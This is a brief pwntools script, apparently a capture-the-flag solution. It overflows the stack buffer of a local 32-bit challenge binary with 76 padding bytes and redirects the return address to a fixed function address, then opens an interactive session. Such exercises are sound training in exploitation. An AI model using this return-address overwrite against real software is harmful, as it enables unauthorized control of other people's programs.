from pwn import *

io = process("./chal_32")

rop = ROP("./chal_32")

payload = b'A'*76 + p32(0x08049196)

io.sendline(payload)
io.interactive()
